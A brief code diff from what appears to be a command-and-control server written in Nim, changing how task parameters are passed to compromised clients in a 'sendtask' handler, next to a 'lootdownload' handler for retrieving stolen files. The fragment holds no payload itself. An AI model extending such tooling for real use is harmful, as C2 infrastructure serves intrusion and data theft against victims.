@@ -31,10 +31,13 @@ proc processMessages(server: C2Server, tcpSocket: AsyncSocket) {.async.} =
       let event = j["event"].getStr()
       case event:
       of "sendtask":
+        var args: seq[string]
+        for arg in j["taskParams"]: args.add arg.getStr()
+
         discard await sendClientTask(
           server.getClientById(j["clientId"].getStr()),
           j["taskName"].getStr(),
-          j["taskParams"]  
+          args  
         )
       of "lootdownload":
         let fileName = j["file"].getStr()
